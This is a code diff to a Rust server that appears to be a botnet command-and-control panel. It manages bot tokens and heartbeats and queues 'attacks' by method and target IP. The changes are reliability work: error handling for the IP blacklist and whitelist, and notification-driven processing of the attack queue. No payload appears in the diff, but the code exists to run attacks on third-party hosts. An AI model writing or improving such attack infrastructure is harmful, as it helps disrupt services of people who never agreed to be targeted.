@@ -65,7 +65,6 @@ fn get_config_dir() -> std::path::PathBuf {
     config_dir
 }
 
-const BOT_HEARTBEAT_INTERVAL: Duration = Duration::from_secs(5);
 const CLEANUP_INTERVAL: Duration = Duration::from_secs(60);
 const BOT_TIMEOUT_SECS: i64 = 30;
 
@@ -86,7 +85,7 @@ async fn main() -> Result<()> {
     
     // Determine config directory
     let config_dir = get_config_dir();
-    let bot_tokens_file = config_dir.join("bot_tokens.json");
+    let _bot_tokens_file = config_dir.join("bot_tokens.json");
     info!("📁 Config directory: {}", config_dir.display());
     
     // Validate configuration
@@ -154,8 +153,20 @@ async fn main() -> Result<()> {
     }
     
     // Load blacklist and whitelist
-    let blacklist = load_ip_list(&db_pool, "blacklist").await;
-    let whitelist = load_ip_list(&db_pool, "whitelist").await;
+    let blacklist = match load_ip_list(&db_pool, "blacklist").await {
+        Ok(list) => list,
+        Err(e) => {
+            error!("Failed to load blacklist: {}", e);
+            return Err(e);
+        }
+    };
+    let whitelist = match load_ip_list(&db_pool, "whitelist").await {
+        Ok(list) => list,
+        Err(e) => {
+            error!("Failed to load whitelist: {}", e);
+            return Err(e);
+        }
+    };
     info!("Loaded {} blacklisted IPs and {} whitelisted IPs", blacklist.len(), whitelist.len());
 
     // Initialize managers
@@ -227,7 +238,8 @@ async fn main() -> Result<()> {
     let state_clone = state.clone();
     tokio::spawn(async move {
         loop {
-            if let Some(request) = state_clone.attack_manager.process_queue().await {
+            // Process all available items
+            while let Some(request) = state_clone.attack_manager.process_queue().await {
                 match state_clone.attack_manager.start_attack(
                     request.method.clone(),
                     request.ip,
@@ -246,7 +258,8 @@ async fn main() -> Result<()> {
                     }
                 }
             }
-            tokio::time::sleep(Duration::from_secs(1)).await;
+            // Wait for notification
+            state_clone.attack_manager.wait_for_queue().await;
         }
     });
     
@@ -379,10 +392,10 @@ async fn update_titles(state: Arc<AppState>) {
     }
 }
 
-async fn load_ip_list(pool: &SqlitePool, table: &str) -> DashSet<IpAddr> {
+async fn load_ip_list(pool: &SqlitePool, table: &str) -> Result<DashSet<IpAddr>> {
     let set = DashSet::new();
     let query = format!("SELECT ip FROM {}", table);
-    let rows = sqlx::query(&query).fetch_all(pool).await.unwrap_or_default();
+    let rows = sqlx::query(&query).fetch_all(pool).await.map_err(|e| CncError::DatabaseError(e))?;
     for row in rows {
         if let Ok(ip_str) = row.try_get::<String, _>("ip") {
             if let Ok(ip) = ip_str.parse::<IpAddr>() {
@@ -390,5 +403,5 @@ async fn load_ip_list(pool: &SqlitePool, table: &str) -> DashSet<IpAddr> {
             }
         }
     }
-    set
+    Ok(set)
 }
